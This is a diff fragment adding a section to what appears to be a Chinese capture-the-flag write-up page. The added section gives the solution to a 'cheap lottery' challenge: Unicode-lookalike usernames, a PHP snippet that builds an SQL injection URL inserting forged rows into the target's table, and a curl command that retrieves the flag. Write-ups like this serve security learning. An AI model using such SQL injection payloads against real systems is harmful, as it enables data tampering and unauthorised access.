@@ -1053,6 +1053,26 @@ if($result['count'] === '12'){
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
+<p><strong>payload:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1
+guest:%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="nv">$a</span> <span class="o">=</span> <span class="nx">vps_ip</span><span class="p">;</span>
+<span class="nv">$time</span> <span class="o">=</span><span class="nb">time</span><span class="p">();</span>
+<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1'),('%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1_"</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">"','</span><span class="nv">$time</span><span class="s2">','1,1,1,1,1'),('%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3_"</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">"','</span><span class="nv">$time</span><span class="s2">','1,1,1,1,1')%23&amp;lottery%5BB%5D=&amp;lottery%5BC%5D=&amp;lottery%5BD%5D=&amp;lottery%5BE%5D="</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nv">$url</span><span class="p">;</span>
+ <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>在 VPS 端:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://cheaplottery.solveme.peng.kr/index.php
+回显即可得到 flag
+</code></pre></div></div>
+
 <h2 id="22check-via-eval">22.Check via eval</h2>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
